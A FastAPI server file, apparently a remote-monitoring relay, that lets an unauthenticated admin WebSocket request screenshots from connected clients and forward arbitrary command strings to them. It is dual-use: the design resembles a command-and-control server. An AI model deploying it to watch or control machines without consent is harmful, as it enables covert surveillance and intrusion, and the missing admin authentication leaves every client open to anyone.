from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, Set
import json

app = FastAPI()

# ===============================
# CONFIG TEMPLATE + STATIC
# ===============================

templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

# ===============================
# STORAGE CONNECTIONS
# ===============================

clients: Dict[str, WebSocket] = {}
admins: Set[WebSocket] = set()

# ===============================
# WEB ADMIN PAGE (HTML của bạn)
# ===============================

@app.get("/", response_class=HTMLResponse)
async def admin_page(request: Request):
    return templates.TemplateResponse("admin.html", {
        "request": request
    })

# ===============================
# CLIENT WEBSOCKET
# ===============================

@app.websocket("/ws/client/{client_id}")
async def client_ws(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket

    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)

            # Client gửi screenshot
            if message.get("type") == "screenshot":
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": message.get("image")
                })

    except WebSocketDisconnect:
        if client_id in clients:
            del clients[client_id]
        await notify_admins_clients()

# ===============================
# ADMIN WEBSOCKET
# ===============================

@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    await websocket.accept()
    admins.add(websocket)

    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)

            # Admin yêu cầu screenshot
            if message.get("type") == "request_screenshot":
                client_id = message.get("client_id")

                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_screenshot"
                    }))

            # Admin gửi lệnh bất kỳ
            if message.get("type") == "command":
                client_id = message.get("client_id")
                command = message.get("command")

                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "command",
                        "command": command
                    }))

    except WebSocketDisconnect:
        admins.remove(websocket)

# ===============================
# HELPER FUNCTIONS
# ===============================

async def notify_admins_clients():
    await broadcast_to_admins({
        "type": "clients",
        "clients": list(clients.keys())
    })

async def broadcast_to_admins(message: dict):
    dead_admins = set()

    for admin in admins:
        try:
            await admin.send_text(json.dumps(message))
        except:
            dead_admins.add(admin)

    for dead in dead_admins:
        admins.remove(dead)
